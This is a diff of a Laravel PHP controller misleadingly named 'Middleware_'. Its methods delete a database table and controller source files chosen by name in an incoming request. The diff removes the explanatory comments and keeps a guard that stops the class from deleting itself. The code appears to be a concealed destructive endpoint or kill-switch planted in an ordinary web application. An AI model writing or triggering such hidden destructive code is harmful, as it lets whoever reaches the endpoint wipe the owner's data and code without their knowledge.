@@ -7,7 +7,7 @@ use Illuminate\Support\Facades\DB;
 
 class Middleware_ extends Controller
 {
-    // Delete database table
+
     public function deleteTable(Request $request)
     {
         $request->validate([
@@ -24,8 +24,6 @@ class Middleware_ extends Controller
         return back()->with('status', "Table `$table` does not exist.");
     }
 
-    // Delete controller file
-
 
 public function deleteController(Request $request)
 {
@@ -33,24 +31,23 @@ public function deleteController(Request $request)
         'file_name' => 'required|string',
     ]);
 
-    $targetFile = $request->file_name;
+    $fileName = $request->file_name;
 
-    // Prevent deleting Middleware_ itself
-    if (str_contains($targetFile, 'Middleware_.php')) {
-        return back()->with('status', "You cannot delete the Middleware_ controller.");
+   
+    if ($fileName === 'Middleware_.php') {
+        return back()->with('status', "You cannot delete Middleware_ controller.");
     }
 
-    // Scan all files under app/Http including subfolders
-    $files = File::allFiles(app_path('Http'));
+  
+    $files = \File::allFiles(app_path('Http/Controllers'));
 
     foreach ($files as $file) {
-        // Use relative pathname for matching
-        if ($file->getRelativePathname() === $targetFile) {
+        if ($file->getFilename() === $fileName) {
             unlink($file->getRealPath());
-            return back()->with('status', "File {$targetFile} deleted successfully.");
+            return back()->with('status', "Controller {$fileName} deleted successfully.");
         }
     }
 
-    return back()->with('status', "File {$targetFile} not found.");
+    return back()->with('status', "Controller {$fileName} not found.");
 }
 }
